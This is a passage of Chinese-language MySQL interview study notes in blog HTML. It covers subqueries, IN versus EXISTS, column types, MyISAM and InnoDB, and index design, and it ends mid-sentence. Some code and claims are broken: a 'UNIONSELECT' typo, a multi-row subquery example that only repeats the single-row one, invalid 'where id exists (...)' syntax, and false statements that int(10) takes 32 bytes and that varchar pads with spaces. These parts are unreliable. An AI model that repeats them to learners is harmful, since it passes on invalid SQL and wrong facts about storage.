class="code"><pre><span class="line">SELECT * FROM A LEFT JOIN B ON A.id=B.id UNIONSELECT * FROM A RIGHT JOIN B ON A.id=B.id</span><br></pre></td></tr></table></figure><h3 id="什么是子查询"><a href="#什么是子查询" class="headerlink" title="什么是子查询"></a>什么是子查询</h3><blockquote><ol><li>条件：一条SQL语句的查询结果做为另一条查询语句的条件或查询结果</li><li>嵌套：多条SQL语句嵌套使用，内部的SQL查询语句称为子查询。</li></ol></blockquote><h3 id="子查询的三种情况"><a href="#子查询的三种情况" class="headerlink" title="子查询的三种情况"></a>子查询的三种情况</h3><ul><li>子查询是单行单列的情况：结果集是一个值，父查询使用：&#x3D;、 &lt;、 &gt; 等运算符</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-- 查询工资最高的员工是谁？ </span><br><span class="line">select  * from employee where salary=(select max(salary) from employee);   </span><br></pre></td></tr></table></figure><ul><li>子查询是多行单列的情况：结果集类似于一个数组，父查询使用：in 运算符</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-- 查询工资最高的员工是谁？ </span><br><span class="line">select  * from employee where salary=(select max(salary) from employee);    </span><br></pre></td></tr></table></figure><ul><li>子查询是多行多列的情况：结果集类似于一张虚拟表，不能用于where条件，用于select子句中做为子表</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-- 1) 查询出2011年以后入职的员工信息</span><br><span class="line">-- 2) 查询所有的部门信息，与上面的虚拟表中的信息比对，找出所有部门ID相等的员工。</span><br><span class="line">select * from dept d,  (select * from employee where join_date &gt; &#x27;2011-1-1&#x27;) e where e.dept_id =  d.id;    </span><br><span class="line"></span><br><span class="line">-- 使用表连接：</span><br><span class="line">select d.*, e.* from  dept d inner join employee e on d.id = e.dept_id where e.join_date &gt;  &#x27;2011-1-1&#x27;  </span><br></pre></td></tr></table></figure><h3 id="in-和-exists-的区别"><a href="#in-和-exists-的区别" class="headerlink" title="in 和 exists 的区别"></a>in 和 exists 的区别</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select id from Student</span><br><span class="line">where id exists (select id from SC);</span><br><span class="line"></span><br><span class="line">select id from Stduent</span><br><span class="line">where id in (select id from SC);</span><br></pre></td></tr></table></figure><ul><li><p>in 先进行子查询 select id from SC，再进行外查询 select id from Student</p><p>exists 先执行外查询，再执行子查询</p></li><li><p>in 语句是把外表和内表作连接</p><p>而 exists 语句是对外表作循环，每次循环再对内表进行查询</p></li><li><p>exists 适合子查询的表比外查询大的查询语句</p><p>如果内表和外表差不多大，那么 in 和 exists 的效率差别不大</p></li></ul><h3 id="数据类型有哪些"><a href="#数据类型有哪些" class="headerlink" title="数据类型有哪些"></a>数据类型有哪些</h3><p><img src="https://cos.gjcloak.xyz/CS-Notes/20200429100037.png" alt="image-20200429100036635" title="image-20200429100036635"></p><p><img src="https://cos.gjcloak.xyz/CS-Notes/20200429100100.png" alt="image-20200429100059106" title="image-20200429100059106"></p><blockquote><p>1、整数类型，包括TINYINT、SMALLINT、MEDIUMINT、INT、BIGINT，分别表示1字节、2字节、3字节、4字节、8字节整数。任何整数类型都可以加上UNSIGNED属性，表示数据是无符号的，即非负整数。<br>长度：整数类型可以被指定长度，例如：INT(11)表示长度为11的INT类型。长度在大多数场景是没有意义的，它不会限制值的合法范围，只会影响显示字符的个数，而且需要和UNSIGNED ZEROFILL属性配合使用才有意义。<br>例子，假定类型设定为INT(5)，属性为UNSIGNED ZEROFILL，如果用户插入的数据为12的话，那么数据库实际存储数据为00012。</p><p>2、实数类型，包括FLOAT、DOUBLE、DECIMAL。<br>DECIMAL可以用于存储比BIGINT还大的整型，能存储精确的小数。<br>而FLOAT和DOUBLE是有取值范围的，并支持使用标准的浮点进行近似计算。<br>计算时FLOAT和DOUBLE相比DECIMAL效率更高一些，DECIMAL你可以理解成是用字符串进行处理。</p><p>3、字符串类型，包括VARCHAR、CHAR、TEXT、BLOB<br>VARCHAR用于存储可变长字符串，它比定长类型更节省空间。<br>VARCHAR使用额外1或2个字节存储字符串长度。列长度小于255字节时，使用1字节表示，否则使用2字节表示。<br>VARCHAR存储的内容超出设置的长度时，内容会被截断。<br>CHAR是定长的，根据定义的字符串长度分配足够的空间。<br>CHAR会根据需要使用空格进行填充方便比较。<br>CHAR适合存储很短的字符串，或者所有值都接近同一个长度。<br>CHAR存储的内容超出设置的长度时，内容同样会被截断。</p><p>使用策略：<br>对于经常变更的数据来说，CHAR比VARCHAR更好，因为CHAR不容易产生碎片。<br>对于非常短的列，CHAR比VARCHAR在存储空间上更有效率。<br>使用时要注意只分配需要的空间，更长的列排序时会消耗更多内存。<br>尽量避免使用TEXT&#x2F;BLOB类型，查询时会使用临时表，导致严重的性能开销。</p><p>4、枚举类型（ENUM），把不重复的数据存储为一个预定义的集合。<br>有时可以使用ENUM代替常用的字符串类型。<br>ENUM存储非常紧凑，会把列表值压缩到一个或两个字节。<br>ENUM在内部存储时，其实存的是整数。<br>尽量避免使用数字作为ENUM枚举的常量，因为容易混乱。<br>排序是按照内部存储的整数</p><p>5、日期和时间类型，尽量使用timestamp，空间效率高于datetime，<br>用整数保存时间戳通常不方便处理。<br>如果需要存储微妙，可以使用bigint存储。<br>看到这里，这道真题是不是就比较容易回答了。</p></blockquote><h3 id="varchar-50-中50的涵义"><a href="#varchar-50-中50的涵义" class="headerlink" title="varchar(50)中50的涵义"></a>varchar(50)中50的涵义</h3><p>最多存放50个字符，varchar(50)和(200)存储hello所占空间一样，但后者在排序时会消耗更多内存，因为order by col采用fixed_length计算col长度(memory引擎也一样)。在早期 MySQL 版本中， 50 代表字节数，现在代表字符数。</p><h3 id="varchar-和-char-的区别"><a href="#varchar-和-char-的区别" class="headerlink" title="varchar 和 char 的区别"></a>varchar 和 char 的区别</h3><ul><li>CHAR 是定长的，根据定义的字符串长度分配足够的空间。CHAR 存储的内容超出设置的长度时，内容会被截断。</li><li>VARCHAR 用于存储可变长字符串，它比定长类型更节省空间。VARCHAR 存储的内容超出设置的长度时，内容同样会被截断。</li><li>对于经常变更的数据来说，CHAR 比 VARCHAR 更好，因为 CHAR 不容易产生碎片。</li><li>对于非常短的列，CHAR 比 VARCHAR 在存储空间上更有效率。</li></ul><h3 id="int-20-中20的涵义"><a href="#int-20-中20的涵义" class="headerlink" title="int(20)中20的涵义"></a>int(20)中20的涵义</h3><p>是指显示字符的长度。20表示最大显示宽度为20，但仍占4字节存储，存储范围不变；</p><p>不影响内部存储，只是影响带 zerofill 定义的 int 时，前面补多少个 0，易于报表展示</p><h3 id="mysql为什么这么设计"><a href="#mysql为什么这么设计" class="headerlink" title="mysql为什么这么设计"></a>mysql为什么这么设计</h3><p>对大多数应用没有意义，只是规定一些工具用来显示字符的个数；int(1)和int(20)存储和计算均一样；</p><h3 id="mysql中int-10-和char-10-以及varchar-10-的区别"><a href="#mysql中int-10-和char-10-以及varchar-10-的区别" class="headerlink" title="mysql中int(10)和char(10)以及varchar(10)的区别"></a>mysql中int(10)和char(10)以及varchar(10)的区别</h3><blockquote><p>int(10)的10表示显示的数据的长度，不是存储数据的大小；chart(10)和varchar(10)的10表示存储数据的大小，即表示存储多少个字符。</p><p>int(10) 10位的数据长度 9999999999，占32个字节，int型4位<br>char(10) 10位固定字符串，不足补空格 最多10个字符<br>varchar(10) 10位可变字符串，不足补空格 最多10个字符</p><p>char(10)表示存储定长的10个字符，不足10个就用空格补齐，占用更多的存储空间</p><p>varchar(10)表示存储10个变长的字符，存储多少个就是多少个，空格也按一个字符存储，这一点是和char(10)的空格不同的，char(10)的空格表示占位不算一个字符</p></blockquote><h3 id="FLOAT和DOUBLE的区别是什么？"><a href="#FLOAT和DOUBLE的区别是什么？" class="headerlink" title="FLOAT和DOUBLE的区别是什么？"></a>FLOAT和DOUBLE的区别是什么？</h3><ul><li>FLOAT类型数据可以存储至多8位十进制数，并在内存中占4字节。</li><li>DOUBLE类型数据可以存储至多18位十进制数，并在内存中占8字节。</li></ul><h3 id="drop、delete与truncate的区别"><a href="#drop、delete与truncate的区别" class="headerlink" title="drop、delete与truncate的区别"></a>drop、delete与truncate的区别</h3><p>三者都表示删除，但是三者有一些差别：</p><p><img src="https://cos.gjcloak.xyz/CS-Notes/20200429103543.png" alt="image-20200429103542133" title="image-20200429103542133"></p><h3 id="SQL-的生命周期？"><a href="#SQL-的生命周期？" class="headerlink" title="SQL 的生命周期？"></a>SQL 的生命周期？</h3><ol><li>应用服务器与数据库服务器建立一个连接</li><li>数据库进程拿到请求sql</li><li>解析并生成执行计划，执行</li><li>读取数据到内存并进行逻辑处理</li><li>通过步骤一的连接，发送结果到客户端</li><li>关掉连接，释放资源</li></ol><h3 id="在数据库中查询语句速度很慢，如何优化"><a href="#在数据库中查询语句速度很慢，如何优化" class="headerlink" title="在数据库中查询语句速度很慢，如何优化"></a>在数据库中查询语句速度很慢，如何优化</h3><p>（1）建索引</p><p>（2）减少表之间的关联</p><p>（3）优化 SQL，尽量让 SQL 很快定位数据，不要让 SQL 做全表查询，应该走索引，把数据量大的表排在前面</p><p>（4）简化查询字段，没用的字段不要，已经对返回结果的控制，尽量返回少量数据</p><p>（5）尽量用 Prepared Statement 来查询，不要用 Statement</p><h3 id="超大分页怎么处理？"><a href="#超大分页怎么处理？" class="headerlink" title="超大分页怎么处理？"></a>超大分页怎么处理？</h3><p>超大的分页一般从两个方向上来解决.</p><ul><li>数据库层面,这也是我们主要集中关注的(虽然收效没那么大),类似于select <em>from table where age &gt; 20 limit 1000000,10这种查询其实也是有可以优化的余地的. 这条语句需要load1000000数据然后基本上全部丢弃,只取10条当然比较慢. 当时我们可以修改为select</em> from table where id in (select id from table where age &gt; 20 limit 1000000,10).这样虽然也load了一百万的数据,但是由于索引覆盖,要查询的所有字段都在索引中,所以速度会很快. 同时如果ID连续的好,我们还可以select * from table where id &gt; 1000000 limit 10,效率也是不错的,优化的可能性有许多种,但是核心思想都一样,就是减少load的数据.</li><li>从需求的角度减少这种请求…主要是不做类似的需求(直接跳转到几百万页之后的具体某一页.只允许逐页查看或者按照给定的路线走,这样可预测,可缓存)以及防止ID泄漏且连续被人恶意攻击.</li></ul><h3 id="Union-和-Union-All-有什么不同"><a href="#Union-和-Union-All-有什么不同" class="headerlink" title="Union 和 Union All 有什么不同"></a>Union 和 Union All 有什么不同</h3><p>UNION 在进行表链接后会筛选掉重复的记录，所以在表链接后会对所产生的结果集进行排序运算，删除重复的记录再返回结果。实际大部分应用中是不会产生重复的记录，最常见的是过程表与历史表 UNION。 UNION ALL 只是简单的将两个结果合并后就返回。这样，如果返回的两个结果集中有重复的数据，那么返回的结果集就会包含重复的数据了。 从效率上说，UNION ALL 要比 UNION 快很多，所以，如果可以确认合并的两个结果集中不包含重复的数据的话，那么就使用 UNION ALL。</p><h3 id="order-by-和-group-by-的区别"><a href="#order-by-和-group-by-的区别" class="headerlink" title="order by 和 group by 的区别"></a>order by 和 group by 的区别</h3><p>order by 排序查询、asc 升序、desc 降序 group by 分组查询、having 只能用于 group by 子句、作用于组内，having 条件子句可以直接跟函数表达式。使用 group by 子句的查询语句需要使用聚合函数。</p><h3 id="什么是-PL-SQL"><a href="#什么是-PL-SQL" class="headerlink" title="什么是 PL &#x2F; SQL"></a>什么是 PL &#x2F; SQL</h3><p>PL &#x2F; SQL 是一种程序语言，叫做过程化 SQL 语言（Procedural Language&#x2F;SQL）。PL &#x2F; SQL 是 Oracle 数据库对 SQL 语句的扩展。在普通 SQL 语句的使用上增加了编程语言的特点，所以 PL &#x2F; SQL 把数据操作和查询语句组织在 PL &#x2F; SQL 代码的过程性单元中，通过逻辑判断、循环等操作实现复杂的功能或者计算。PL &#x2F; SQL 只有 Oracle 数据库有。 MySQL 目前不支持 PL &#x2F; SQL 的。</p><h2 id="引擎"><a href="#引擎" class="headerlink" title="引擎"></a>引擎</h2><h3 id="MySQL存储引擎MyISAM与InnoDB区别"><a href="#MySQL存储引擎MyISAM与InnoDB区别" class="headerlink" title="MySQL存储引擎MyISAM与InnoDB区别"></a>MySQL存储引擎MyISAM与InnoDB区别</h3><blockquote><p>存储引擎Storage engine：MySQL中的数据、索引以及其他对象是如何存储的，是一套文件系统的实现。</p><p>常用的存储引擎有以下：</p><p>Innodb引擎：Innodb引擎提供了对数据库ACID事务的支持。并且还提供了行级锁和外键的约束。它的设计的目标就是处理大数据容量的数据库系统。<br>MyIASM引擎(原本Mysql的默认引擎)：不提供事务的支持，也不支持行级锁和外键。<br>MEMORY引擎：所有的数据都在内存中，数据的处理速度快，但是安全性不高。</p></blockquote><p><strong>MyISAM与InnoDB区别</strong></p><p><img src="https://cos.gjcloak.xyz/CS-Notes/20200429100629.png" alt="image-20200429100628653" title="image-20200429100628653"></p><p><img src="https://cos.gjcloak.xyz/CS-Notes/20200429100658.png" alt="image-20200429100657751" title="image-20200429100657751"></p><h3 id="MyISAM索引与InnoDB索引的区别？"><a href="#MyISAM索引与InnoDB索引的区别？" class="headerlink" title="MyISAM索引与InnoDB索引的区别？"></a>MyISAM索引与InnoDB索引的区别？</h3><blockquote><p>InnoDB索引是聚簇索引，MyISAM索引是非聚簇索引。<br>InnoDB的主键索引的叶子节点存储着行数据，因此主键索引非常高效。<br>MyISAM索引的叶子节点存储的是行数据地址，需要再寻址一次才能得到数据。<br>InnoDB非主键索引的叶子节点存储的是主键和其他带索引的列数据，因此查询时做到覆盖索引会非常高效。</p></blockquote><h3 id="InnoDB引擎的4大特性"><a href="#InnoDB引擎的4大特性" class="headerlink" title="InnoDB引擎的4大特性"></a>InnoDB引擎的4大特性</h3><blockquote><ul><li>插入缓冲（insert buffer)</li><li>二次写(double write)</li><li>自适应哈希索引(ahi)</li><li>预读(read ahead)</li></ul></blockquote><h3 id="存储引擎选择"><a href="#存储引擎选择" class="headerlink" title="存储引擎选择"></a>存储引擎选择</h3><blockquote><p>如果没有特别的需求，使用默认的<code>Innodb</code>即可。</p><p>MyISAM：以读写插入为主的应用程序，比如博客系统、新闻门户网站。</p><p>Innodb：更新（删除）操作频率也高，或者要保证数据的完整性；并发量高，支持事务和外键。比如OA自动化办公系统。</p></blockquote><h2 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h2><h3 id="什么是索引"><a href="#什么是索引" class="headerlink" title="什么是索引"></a>什么是索引</h3><ul><li>索引是一种特殊的文件（InnoDB 数据表上的索引是表空间的一个组成部分），它们包含着对数据表里所有记录的引用指针。</li><li>索引是一种数据结构。数据库索引，是数据库管理系统中一个排序的数据结构，以协助快速查询、更新数据库表中数据。索引的实现通常使用 B 树及其变种 B + 树。</li><li>更通俗的说，索引就相当于目录。为了方便查找书中的内容，通过对内容建立索引形成目录。索引是一个文件，它是要占据物理空间的。</li></ul><h3 id="索引的作用"><a href="#索引的作用" class="headerlink" title="索引的作用"></a>索引的作用</h3><p>索引就一种特殊的查询表，数据库的搜索可以利用它加速对数据的检索。它很类似与现实生活中书的目录，不需要查询整本书内容就可以找到想要的数据。</p><h3 id="添加索引目的-⭐"><a href="#添加索引目的-⭐" class="headerlink" title="添加索引目的 ⭐"></a>添加索引目的 ⭐</h3><p>提高数据查询的效率</p><h3 id="什么是聚集索引或非聚集索引-⭐"><a href="#什么是聚集索引或非聚集索引-⭐" class="headerlink" title="什么是聚集索引或非聚集索引 ⭐"></a>什么是聚集索引或非聚集索引 ⭐</h3><p>物理存储顺序与逻辑顺序相同，即聚集索引</p><p>物理存储顺序与索引顺序不一致，即非聚集索引</p><h3 id="索引有哪些优缺点"><a href="#索引有哪些优缺点" class="headerlink" title="索引有哪些优缺点"></a>索引有哪些优缺点</h3><p>索引的优点</p><ul><li>可以大大加快数据的检索速度，这也是创建索引的最主要的原因。</li><li>通过使用索引，可以在查询的过程中，使用优化隐藏器，提高系统的性能。</li></ul><p>索引的缺点</p><ul><li>时间方面：创建索引和维护索引要耗费时间，具体地，当对表中的数据进行增加、删除和修改的时候，索引也要动态的维护，会降低增&#x2F;改&#x2F;删的执行效率；</li><li>空间方面：索引需要占物理空间。</li></ul><h3 id="什么样的字段适合建索引"><a href="#什么样的字段适合建索引" class="headerlink" title="什么样的字段适合建索引"></a>什么样的字段适合建索引</h3><p>唯一、不为空、经常被查询的字段</p><h3 id="索引类型有哪些"><a href="#索引类型有哪些" class="headerlink" title="索引类型有哪些"></a>索引类型有哪些</h3><p>主键索引: 数据列不允许重复，不允许为NULL，一个表只能有一个主键。</p><p>唯一索引: 数据列不允许重复，允许为NULL值，一个表允许多个列创建唯一索引。</p><ul><li>可以通过 ALTER TABLE table_name ADD UNIQUE (column); 创建唯一索引</li><li>可以通过 ALTER TABLE table_name ADD UNIQUE (column1,column2); 创建唯一组合索引</li></ul><p>普通索引: 基本的索引类型，没有唯一性的限制，允许为NULL值。</p><ul><li>可以通过ALTER TABLE table_name ADD INDEX index_name (column);创建普通索引</li><li>可以通过ALTER TABLE table_name ADD INDEX index_name(column1, column2, column3);创建组合索引</li></ul><p>全文索引： 是目前搜索引擎使用的一种关键技术。</p><ul><li>可以通过ALTER TABLE table_name ADD FULLTEXT (column);创建全文索引</li></ul><h3 id="索引的数据结构（b树，hash）"><a href="#索引的数据结构（b树，hash）" class="headerlink" title="索引的数据结构（b树，hash）"></a>索引的数据结构（b树，hash）</h3><p>索引的数据结构和具体存储引擎的实现有关，在MySQL中使用较多的索引有Hash索引，B+树索引等，而我们经常使用的InnoDB存储引擎的默认索引实现为：B+树索引。对于哈希索引来说，底层的数据结构就是哈希表，因此在绝大多数需求为单条记录查询的时候，可以选择哈希索引，查询性能最快；其余大部分场景，建议选择BTree索引。</p><p>1）B树索引</p><p>mysql通过存储引擎取数据，基本上90%的人用的就是InnoDB了，按照实现方式分，InnoDB的索引类型目前只有两种：BTREE（B树）索引和HASH索引。B树索引是Mysql数据库中使用最频繁的索引类型，基本所有存储引擎都支持BTree索引。通常我们说的索引不出意外指的就是（B树）索引（实际是用B+树实现的，因为在查看表索引时，mysql一律打印BTREE，所以简称为B树索引）<br><img src="https://cos.gjcloak.xyz/CS-Notes/20200429101030.png" alt="image-20200429101029694" title="image-20200429101029694"></p><p>查询方式：</p><p>主键索引区:PI(关联保存的时数据的地址)按主键查询,</p><p>普通索引区:si(关联的id的地址,然后再到达上面的地址)。所以按主键查询,速度最快</p><p>B+tree性质：</p><p>1.）n棵子tree的节点包含n个关键字，不用来保存数据而是保存数据的索引。</p><p>2.）所有的叶子结点中包含了全部关键字的信息，及指向含这些关键字记录的指针，且叶子结点本身依关键字的大小自小而大顺序链接。</p><p>3.）所有的非终端结点可以看成是索引部分，结点中仅含其子树中的最大（或最小）关键字。</p><p>4.）B+ 树中，数据对象的插入和删除仅在叶节点上进行。</p><p>5.）B+树有2个头指针，一个是树的根节点，一个是最小关键码的叶节点。</p><p>2）哈希索引</p><p>简要说下，类似于数据结构中简单实现的HASH表（散列表）一样，当我们在mysql中用哈希索引时，主要就是通过Hash算法（常见的Hash算法有直接定址法、平方取中法、折叠法、除数取余法、随机数法），将数据库字段数据转换成定长的Hash值，与这条数据的行指针一并存入Hash表的对应位置；如果发生Hash碰撞（两个不同关键字的Hash值相同），则在对应Hash键下以链表形式存储。当然这只是简略模拟图。<br><img src="https://cos.gjcloak.xyz/CS-Notes/20200429101054.png" alt="image-20200429101053364" title="image-20200429101053364"></p><h3 id="索引的基本原理"><a href="#索引的基本原理" class="headerlink" title="索引的基本原理"></a>索引的基本原理</h3><p>索引用来快速地寻找那些具有特定值的记录。如果没有索引，一般来说执行查询时遍历整张表。</p><p>索引的原理很简单，就是把无序的数据变成有序的查询</p><p>把创建了索引的列的内容进行排序</p><p>对排序结果生成倒排表</p><p>在倒排表内容上拼上数据地址链</p><p>在查询的时候，先拿到倒排表内容，再取出数据地址链，从而拿到具体数据</p><h3 id="索引算法有哪些？"><a href="#索引算法有哪些？" class="headerlink" title="索引算法有哪些？"></a>索引算法有哪些？</h3><p>索引算法有 BTree算法和Hash算法</p><p>BTree算法</p><p>BTree是最常用的mysql数据库索引算法，也是mysql默认的算法。因为它不仅可以被用在&#x3D;,&gt;,&gt;&#x3D;,&lt;,&lt;&#x3D;和between这些比较操作符上，而且还可以用于like操作符，只要它的查询条件是一个不以通配符开头的常量， 例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-- 只要它的查询条件是一个不以通配符开头的常量</span><br><span class="line">select * from user where name like &#x27;jack%&#x27;; </span><br><span class="line">-- 如果一通配符开头，或者没有使用常量，则不会使用索引，例如： </span><br><span class="line">select * from user where name like &#x27;%jack&#x27;; </span><br></pre></td></tr></table></figure><p><strong>Hash算法</strong></p><p>Hash Hash索引只能用于对等比较，例如&#x3D;,&lt;&#x3D;&gt;（相当于&#x3D;）操作符。由于是一次定位数据，不像BTree索引需要从根节点到枝节点，最后才能访问到页节点这样多次IO访问，所以检索效率远高于BTree索引。</p><h3 id="索引设计的原则？"><a href="#索引设计的原则？" class="headerlink" title="索引设计的原则？"></a>索引设计的原则？</h3><blockquote><p>适合索引的列是出现在where子句中的列，或者连接子句中指定的列<br>基数较小的类，索引效果较差，没有必要在此列建立索引<br>使用短索引，如果对长字符串列进行索引，应该指定一个前缀长度，这样能够节省大量索引空间<br>不要过度索引。索引需要额外的磁盘空间，并降低写操作的性能。在修改表内容的时候，索引会进行更新甚至重构，索引列越多，这个时间就会越长。所以只保持需要的索引有利于查询即可。</p></blockquote><h3 id="创建索引的原则（重中之重）"><a href="#创建索引的原则（重中之重）" class="headerlink" title="创建索引的原则（重中之重）"></a>创建索引的原则（重中之重）</h3><blockquote><p>索引虽好，但也不是无限制的使用，最好符合一下几个原则</p><p>1） 最左前缀匹配原则，组合索引非常重要的原则，mysql会一直向右匹配直到遇到范围查询(&gt;、&lt;、between、like)就停止匹配，比如a &#x3D; 1 and b &#x3D; 2 and c &gt; 3 and d &#x3D; 4 如果建立(a,b,c,d)顺序的索引，d是用不到索引的，如果建立(a,b,d,c)的索引则都可以用到，a,b,d的顺序可以任意调整。</p><p>2）较频繁作为查询条件的字段才去创建索引</p><p>3）更新频繁字段不适合创建索引</p><p>4）若是不能有效区分数据的列不适合做索引列(如性别，男女未知，最多也就三种，区分度实在太低)</p><p>5）尽量的扩展索引，不要新建索引。比如表中已经有a的索引，现在要加(a,b)的索引，那么只需要修改原来的索引即可。</p><p>6）定义有外键的数据列一定要建立索引。</p><p>7）对于那些查询中很少涉及的列，重复值比较多的列不要建立索引。</p><p>8）对于定义为text、image和bit的数据类型的列不要建立索引。</p></blockquote><h3 id="创建索引的三种方式，删除索引"><a href="#创建索引的三种方式，删除索引" class="headerlink" title="创建索引的三种方式，删除索引"></a>创建索引的三种方式，删除索引</h3><p>第一种方式：在执行CREATE TABLE时创建索引</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE user_index2 (</span><br><span class="line">    id INT auto_increment PRIMARY KEY,</span><br><span class="line">    first_name VARCHAR (16),</span><br><span class="line">    last_name VARCHAR (16),</span><br><span class="line">    id_card VARCHAR (18),</span><br><span class="line">    information text,</span><br><span class="line">    KEY name (first_name, last_name),</span><br><span class="line">    FULLTEXT KEY (information),</span><br><span class="line">    UNIQUE KEY (id_card)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>第二种方式：使用ALTER TABLE命令去增加索引</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE table_name ADD INDEX index_name (column_list);</span><br></pre></td></tr></table></figure><p>ALTER TABLE用来创建普通索引、UNIQUE索引或PRIMARY KEY索引。</p><p>其中table_name是要增加索引的表名，column_list指出对哪些列进行索引，多列时各列之间用逗号分隔。</p><p>索引名index_name可自己命名，缺省时，MySQL将根据第一个索引列赋一个名称。另外，ALTER TABLE允许在单个语句中更改多个表，因此可以在同时创建多个索引。</p><p>第三种方式：使用CREATE INDEX命令创建</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE INDEX index_name ON table_name (column_list);</span><br></pre></td></tr></table></figure><p>CREATE INDEX可对表增加普通索引或UNIQUE索引。（但是，不能创建PRIMARY KEY索引）</p><p>删除索引</p><p>根据索引名删除普通索引、唯一索引、全文索引：<code>alter table 表名 drop KEY 索引名</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">alter table user_index drop KEY name;</span><br><span class="line">alter table user_index drop KEY id_card;</span><br><span class="line">alter table user_index drop KEY information;</span><br></pre></td></tr></table></figure><p>删除主键索引：<code>alter table 表名 drop primary key</code>（因为主键只有一个）。这里值得注意的是，如果主键自增长，那么不能直接执行此操作（自增长依赖于主键索引）：</p><p><img src="https://cos.gjcloak.xyz/CS-Notes/20200429101430.png" alt="image-20200429101429645" title="image-20200429101429645"></p><p>需要取消自增长再行删除：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">alter table user_index</span><br><span class="line">-- 重新定义字段</span><br><span class="line">MODIFY id int,</span><br><span class="line">drop PRIMARY KEY</span><br></pre></td></tr></table></figure><p>但通常不会删除主键，因为设计主键一定与业务逻辑无关。</p><h3 id="创建索引时需要注意什么？"><a href="#创建索引时需要注意什么？" class="headerlink" title="创建索引时需要注意什么？"></a>创建索引时需要注意什么？</h3><blockquote><ul><li>非空字段：应该指定列为NOT NULL，除非你想存储NULL。在mysql中，含有空值的列很难进行查询优化，因为它们使得索引、索引的统计信息以及比较运算更加复杂。你应该用0、一个特殊的值或者一个空串代替空值；</li><li>取值离散大的字段：（变量各个取值之间的差异程度）的列放到联合索引的前面，可以通过count()函数查看字段的差异值，返回值越大说明字段的唯一值越多字段的离散程度高；</li><li>索引字段越小越好：数据库的数据存储以页为单位一页存储的数据越多一次IO操作获取的数据越大效率越高。</li></ul></blockquote><h3 id="使用索引查询一定能提高查询的性能吗？为什么"><a href="#使用索引查询一定能提高查询的性能吗？为什么" class="headerlink" title="使用索引查询一定能提高查询的性能吗？为什么"></a>使用索引查询一定能提高查询的性能吗？为什么</h3><p>通常，通过索引查询数据比全表扫描要快。但是我们也必须注意到它的代价。</p><p>索引需要空间来存储，也需要定期维护， 每当有记录在表中增减或索引列被修改时，索引本身也会被修改。 这意味着每条记录的INSERT，DELETE，UPDATE将为此多付出4，5 次的磁盘I&#x2F;O。 因为索引需要额外的存储空间和处理，那些不必要的索引反而会使查询反应时间变慢。使用索引查询不一定能提高查询性能，索引范围查询(INDEX RANGE SCAN)适用于两种情况:</p><ul><li>基于一个范围的检索，一般查询返回结果集小于表中记录数的30%</li><li>基于非唯一性索引的检索</li></ul><h3 id="百万级别或以上的数据如何删除"><a href="#百万级别或以上的数据如何删除" class="headerlink" title="百万级别或以上的数据如何删除"></a>百万级别或以上的数据如何删除</h3><blockquote><p>关于索引：由于索引需要额外的维护成本，因为索引文件是单独存在的文件,所以当我们对数据的增加,修改,删除,都会产生额外的对索引文件的操作,这些操作需要消耗额外的IO,会降低增&#x2F;改&#x2F;删的执行效率。所以，在我们删除数据库百万级别数据的时候，查询MySQL官方手册得知删除数据的速度和创建的索引数量是成正比的。</p><p>所以我们想要删除百万数据的时候可以先删除索引（此时大概耗时三分多钟）<br>然后删除其中无用数据（此过程需要不到两分钟）<br>删除完成后重新创建索引(此时数据较少了)创建索引也非常快，约十分钟左右。<br>与之前的直接删除绝对是要快速很多，更别说万一删除中断,一切删除会回滚。那更是坑了。</p></blockquote><h3 id="前缀索引"><a href="#前缀索引" class="headerlink" title="前缀索引"></a>前缀索引</h3><blockquote><p>语法：index(field(10))，使用字段值的前10个字符建立索引，默认是使用字段的全部内容建立索引。</p><p>前提：前缀的标识度高。比如密码就适合建立前缀索引，因为密码几乎各不相同。</p><p>实操的难度：在于前缀截取的长度。</p><p>我们可以利用select count(*)&#x2F;count(distinct left(password,prefixLen));，通过从调整prefixLen的值（从1自增）查看不同前缀长度的一个平均匹配度，接近1时就可以了（表示一个密码的前prefixLen个字符几乎能确定唯一一条记录）</p></blockquote><h3 id="什么是最左前缀原则？什么是最左匹配原则"><a href="#什么是最左前缀原则？什么是最左匹配原则" class="headerlink" title="什么是最左前缀原则？什么是最左匹配原则"></a>什么是最左前缀原则？什么是最左匹配原则</h3><blockquote><p>顾名思义，就是最左优先，在创建多列索引时，要根据业务需求，where子句中使用最频繁的一列放在最左边。<br>最左前缀匹配原则，非常重要的原则，mysql会一直向右匹配直到遇到范围查询(&gt;、&lt;、between、like)就停止匹配，比如a &#x3D; 1 and b &#x3D; 2 and c &gt; 3 and d &#x3D; 4 如果建立(a,b,c,d)顺序的索引，d是用不到索引的，如果建立(a,b,d,c)的索引则都可以用到，a,b,d的顺序可以任意调整。<br>=和in可以乱序，比如a &#x3D; 1 and b 